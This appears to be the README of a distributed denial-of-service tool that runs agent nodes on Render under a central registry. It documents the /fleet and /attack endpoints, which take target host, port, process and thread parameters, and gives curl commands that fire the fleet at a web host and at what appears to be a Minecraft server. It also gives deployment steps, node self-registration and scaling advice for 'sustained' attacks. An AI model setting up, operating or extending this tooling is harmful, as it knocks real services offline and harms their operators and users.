# Fleet control stack

## File tree

```text
.
├── README.md
├── render.yaml
├── .gitignore
├── fold.py
├── ui/
│   └── index.html
└── __pycache__/
```

## Environment variables

| Name | Required | Purpose |
| --- | --- | --- |
| TOKEN | Yes | Shared secret required on registry and node requests when enabled. |
| REGISTRY | Yes for agents | Registry base URL used for heartbeat and registration. |
| PROCS | No | Number of drone processes to spawn on each agent. Default 2. |
| THREADS | No | Number of threads per child dripper worker. Default 32. |
| PORT | No | HTTP port for the service. Default 8000. |
| NODE_ID | No | Optional node name override; otherwise Render service name is used. |

## Endpoints

### Registry

| Method | Path | Result |
| --- | --- | --- |
| GET | /ui | Dashboard HTML. |
| GET | /nodes | JSON array of registered nodes. |
| GET | /fleet?host=&port=&procs=&threads=&mc=1 | Fires all nodes with the provided parameters. Returns `{"fired": n}`. |
| GET | /stop | Stops all active jobs. Returns `{"fired": n}`. |
| POST | /register | Registers a node as `{"node","url"}`. Returns `{"ok": true}`. |

### Agent

| Method | Path | Result |
| --- | --- | --- |
| GET | / | Node status object. |
| GET | /attack?host=&port=&procs=&threads=&mc=1 | Starts the target attack. Returns `{"ok": true}`. |
| GET | /stop | Stops the running attack. Returns `{"ok": true}`. |

## Render deploy steps

1. Create a new Render Blueprint using this repository.
2. Confirm the `reg` service appears and note the final public URL.
3. Replace `https://reg.onrender.com` in `render.yaml` with the actual registry URL if your deployment uses a different host.
4. Deploy the blueprint.
5. After the registry is live, open the dashboard on the registry URL, for example:

```text
https://reg.onrender.com/ui
```

## Bookmark the dashboard with a token

Use a URL like this to prefill the registry and token:

```text
https://reg.onrender.com/ui?r=https://reg.onrender.com&k=shared-secret
```

The dashboard saves registry URL, target, token, and form values in `localStorage` automatically.

## Fire from curl

```bash
curl "https://reg.onrender.com/fleet?k=shared-secret&host=example.com&port=80&procs=2&threads=32"
curl "https://reg.onrender.com/fleet?k=shared-secret&host=play.mcserver.net&port=25565&procs=2&threads=32&mc=1"
```

## Add a node

A node starts itself with:

```bash
REGISTRY=https://reg.onrender.com TOKEN=shared-secret python3 fold.py agent
```

The agent heartbeats every 30 seconds. If the registry is reachable, it registers itself automatically.

## Sizing note

Free Render instances are 0.1 vCPU and have 4 source IPs. The 750-hour monthly cap only supports one always-on service. For sustained reliable ops, 3 to 5 cheap VPS nodes beat 20 free instances.

